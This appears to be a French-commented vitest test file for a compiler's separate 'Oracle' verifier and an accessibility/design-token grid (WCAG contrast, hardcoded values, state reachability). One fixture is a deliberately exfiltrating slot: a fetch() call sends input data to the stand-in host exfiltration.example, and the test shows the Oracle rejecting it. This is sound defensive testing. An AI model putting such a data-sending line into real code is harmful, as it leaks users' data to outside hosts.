// ORACLE — CONTRÔLES AJOUTÉS EN PHASE 9 (politique AST des slots, intégrité
// des copies) + GRILLE A++ instrumentée.
//
// Le point capital prouvé ici : le COMPILATEUR n'est pas juge. Il émet le
// code d'auteur verbatim ; c'est l'ORACLE, service séparé, qui refuse
// l'artefact. Un slot exfiltrant des données passe donc la compilation et
// est arrêté à la vérification — exactement la séparation exigée au §9.
import { readFileSync, readdirSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";
import { compileProject } from "@deribfy/compiler";
import type { ProjectAir } from "@deribfy/air-schema";
import { runOracleLevel1 } from "../src/level1.ts";
import {
  TEXT_FOREGROUNDS,
  apxxRegressions,
  contrastRatio,
  evaluateApxxGrid,
  textForegrounds,
} from "../src/apxx-grid.ts";

const CORPUS = join(dirname(fileURLToPath(import.meta.url)), "..", "..", "golden-corpus", "corpus-v2");
const docs = readdirSync(CORPUS)
  .filter((f) => f.endsWith(".air.json"))
  .sort();
const load = (f: string): unknown => JSON.parse(readFileSync(join(CORPUS, f), "utf8"));
const resto = load("resto-quartier.air.json");

const CONFORME = `export function runSlot(entrees: { statut: string }): { libelle: string } {
  return { libelle: entrees.statut };
}
`;
const EXFILTRANT = `export function runSlot(entrees: { statut: string }): { libelle: string } {
  fetch("https://exfiltration.example/c?s=" + entrees.statut);
  return { libelle: entrees.statut };
}
`;
const slot = (source: string) => ({
  slotId: "slot_libelle_statut_commande",
  source,
  authorId: "test",
});

describe("Oracle — politique AST rejouée sur l'artefact", () => {
  it("slot conforme : verdict PASSE et slot compté", () => {
    const expected = compileProject(resto, undefined, { slots: [slot(CONFORME)] }).rootHash;
    const v = runOracleLevel1(resto, expected, { slots: [slot(CONFORME)] });
    expect(v.passed, JSON.stringify(v.checks.filter((c) => !c.passed))).toBe(true);
    expect(v.checks.find((c) => c.name === "slots_politique_ast")?.detail).toContain("1 slot(s) émis");
  });

  it("slot exfiltrant : le compilateur émet, l'ORACLE refuse", () => {
    // 1. le compilateur ne juge pas : l'émission réussit et le code est intact
    const compiled = compileProject(resto, undefined, { slots: [slot(EXFILTRANT)] });
    expect(compiled.files.get("slots/slot_libelle_statut_commande.ts")).toBe(EXFILTRANT);
    // 2. l'Oracle, lui, refuse l'artefact
    const v = runOracleLevel1(resto, compiled.rootHash, { slots: [slot(EXFILTRANT)] });
    expect(v.passed).toBe(false);
    const check = v.checks.find((c) => c.name === "slots_politique_ast");
    expect(check?.passed).toBe(false);
    expect(check?.detail).toContain("SLOT_NETWORK_ACCESS");
  });

  it("sans slot, le contrôle est satisfait de façon explicite", () => {
    const v = runOracleLevel1(resto, compileProject(resto).rootHash);
    expect(v.checks.find((c) => c.name === "slots_politique_ast")?.detail).toContain("0 slot(s) émis");
  });

  it("intégrité des copies : 12 copies conformes octet à octet", () => {
    const v = runOracleLevel1(resto, compileProject(resto).rootHash);
    const check = v.checks.find((c) => c.name === "copies_integrite");
    expect(check?.passed).toBe(true);
    expect(check?.detail).toContain("copies conformes");
  });
});

describe("grille A++ — instrument déterministe", () => {
  it("calcul de contraste conforme à WCAG 2.2 (valeurs de référence)", () => {
    // Contrôle du calcul lui-même contre des valeurs connues : noir/blanc =
    // 21:1 exactement ; l'accent de marque sur blanc = 3,16:1 (valeur déjà
    // mesurée et consignée en DET-014).
    expect(contrastRatio("#000000", "#FFFFFF")).toBeCloseTo(21, 5);
    expect(contrastRatio("#FFFFFF", "#FFFFFF")).toBeCloseTo(1, 5);
    expect(contrastRatio("#FA5D1E", "#FFFFFF")).toBeCloseTo(3.16, 2);
  });

  it("verdict identique sur les 12 documents (l'instrument est stable)", () => {
    const signatures = new Set<string>();
    for (const file of docs) {
      const air = load(file) as ProjectAir;
      const report = evaluateApxxGrid(compileProject(air).files, air);
      signatures.add(report.dimensions.map((d) => `${d.dimension}:${d.state}`).join("|"));
    }
    // ÉDITION CONSCIENTE (Phase 10) : D passe à `non_conforme` parce que
    // l'INSTRUMENT a été renforcé — il mesure désormais les quatre familles
    // que le critère nomme (espacements, rayons, couleurs, typographie) au
    // lieu des seules couleurs hexadécimales. Le code émis n'a pas changé ;
    // c'est la mesure qui a cessé d'être partielle. Écart consigné :
    // DET-022 (9 valeurs en dur : 8 `fontWeight`, 1 `paddingVertical: 2`).
    // ÉDITION CONSCIENTE (Phase 10, P-007 — design system v2) : B et D
    // passent CONFORMES. B : l'accent a cessé d'être une couleur de texte
    // (encre dérivée, 36 paires mesurées dont 6 nouvelles sur `badgeBg`).
    // D : graisses, pas fin d'espacement et opacité sont tokenisés.
    // ÉDITION CONSCIENTE (2026-08-30, D-052 volet A1) : C passe à
    // `non_conforme` parce que l'INSTRUMENT a été corrigé — il mesurait la
    // présence de `state.kind === "loading"` dans le SOURCE du composant émis,
    // c'est-à-dire « le composant SAIT rendre l'état », jamais « l'état EST
    // ATTEINT ». Il mesure désormais l'atteignabilité, source cliquetée contre
    // le runtime. Le code émis n'a pas changé ; c'est la mesure qui a cessé de
    // porter sur autre chose que la propriété nommée. Écart consigné :
    // DET-028 / APP-D003 — `list` ne rend que `empty`/`ready`, `form` que
    // `ready`, `detail_header` aucun état.
    // ÉDITION CONSCIENTE (2026-08-31, D-060) : C repasse CONFORME — et cette
    // fois ce n'est PAS l'instrument qui a bougé, c'est le MOTEUR.
    // D-052 avait rendu la mesure honnête : elle porte sur l'ATTEIGNABILITÉ.
    // Elle y porte toujours, à l'identique. Ce qui a changé, c'est que les
    // états sont désormais ATTEINTS : `DataProvider.status?()` rend `loading` et
    // `error` possibles, et le registre 1.1.0 les rend exprimables sur `form` et
    // `detail_header` — qui n'en avaient AUCUN moyen. Chacun a été OBSERVÉ au
    // rendu, contrôle négatif inclus (`etats-atteints.obs.tsx`), AVANT d'entrer
    // dans l'enveloppe. Aucune ligne de la grille n'a été touchée.
    expect([...signatures]).toEqual([
      "A:conforme|B:conforme|C:conforme|D:conforme|E:conforme|F:conforme|G:conforme|H:non_determinee",
    ]);
  });

  it("dimension B : conforme après la v2, sur un jeu de paires ÉLARGI", () => {
    const air = resto as ProjectAir;
    const report = evaluateApxxGrid(compileProject(air).files, air);
    const b = report.dimensions.find((d) => d.dimension === "B");
    // 36 paires (18 par schéma) — six de PLUS qu'avant la v2, dont les tons
    // d'état sur `badgeBg` qui n'étaient pas mesurés et ont révélé le
    // défaut `warn` 4,34:1, corrigé en tokens 1.2.0.
    expect(b?.state).toBe("conforme");
    expect(b?.detail).toBe("36 paires / 0 échec");
  });

  it("CLIQUET ANTI-CONTOURNEMENT : les paires couvrent TOUTES les couleurs de texte", () => {
    // Sans ce contrôle, il suffirait de retirer une paire gênante de la
    // liste pour obtenir du vert. Ici, la liste est confrontée aux couleurs
    // réellement utilisées comme texte dans la feuille de style ÉMISE.
    const compiled = compileProject(resto);
    expect(textForegrounds(compiled.files.get("lib/primitives/styles.ts") ?? "")).toEqual(
      [...TEXT_FOREGROUNDS],
    );
  });

  it("H n'est jamais conforme par défaut ; C l'est redevenue par le MOTEUR (D-060)", () => {
    const air = resto as ProjectAir;
    const report = evaluateApxxGrid(compileProject(air).files, air);
    expect(report.dimensions.find((d) => d.dimension === "H")?.state).toBe("non_determinee");
    expect(report.dimensions.find((d) => d.dimension === "C")?.state).toBe("conforme");
    // ÉDITION CONSCIENTE (2026-08-31, D-060) : `passed` porte sur A–G et
    // redevient `true`. Il ne faut PAS y lire l'inverse de D-052 : là,
    // l'instrument avait cessé de mentir et C était tombée sans que le produit
    // change. Ici, l'INSTRUMENT EST INCHANGÉ et c'est le produit qui a bougé —
    // trois états rendus atteignables, chacun observé au rendu avec contrôle
    // négatif. **H reste `non_determinee` sur un document seul** : A++ complet
    // exige la mesure cross-domain, qui n'est pas de ce test.
    expect(report.passed).toBe(true);
  });

  it("comparateur de non-régression : détecte une dégradation, pas une amélioration", () => {
    const air = resto as ProjectAir;
    const base = evaluateApxxGrid(compileProject(air).files, air);
    const degrade = {
      ...base,
      dimensions: base.dimensions.map((d) =>
        d.dimension === "G" ? { ...d, state: "non_conforme" as const } : d,
      ),
    };
    const ameliore = {
      ...base,
      dimensions: base.dimensions.map((d) =>
        d.dimension === "B" ? { ...d, state: "conforme" as const } : d,
      ),
    };
    expect(apxxRegressions(base, degrade)).toEqual(["G"]);
    expect(apxxRegressions(base, ameliore)).toEqual([]);
    expect(apxxRegressions(base, base)).toEqual([]);
  });
});

describe("dimension D — instrument renforcé en Phase 10", () => {
  it("les 4 familles du critère sont mesurées, la mise en page est ignorée", () => {
    // Contrôle du POUVOIR DE DÉTECTION de l'instrument : il doit voir une
    // valeur de design en dur, et ignorer une propriété de mise en page.
    const files = new Map<string, string>([
      ["lib/tokens/theme.generated.ts", ""],
      ["a.ts", 'const s = { flex: 1, alignItems: "center", textAlign: "left" };'],
    ]);
    const air = resto as ProjectAir;
    const propre = evaluateApxxGrid(files, air).dimensions.find((d) => d.dimension === "D");
    expect(propre?.state).toBe("conforme");

    for (const [nom, code] of [
      ["couleur", 'const s = { color: "#123456" };'],
      ["espacement", "const s = { paddingVertical: 2 };"],
      ["rayon", "const s = { borderRadius: 8 };"],
      ["typographie", 'const s = { fontWeight: "600" };'],
    ] as const) {
      const sale = new Map(files).set("a.ts", code);
      const verdict = evaluateApxxGrid(sale, air).dimensions.find((d) => d.dimension === "D");
      expect(verdict?.state, nom).toBe("non_conforme");
      expect(verdict?.detail, nom).toContain(nom);
    }
  });

  it("mesure réelle : 0 valeur en dur depuis la v2 (était 9)", () => {
    const air = resto as ProjectAir;
    const verdict = evaluateApxxGrid(compileProject(air).files, air).dimensions.find(
      (d) => d.dimension === "D",
    );
    expect(verdict?.state).toBe("conforme");
    expect(verdict?.detail).toBe("0 valeur en dur (couleurs, espacements, rayons, typographie)");
  });
});
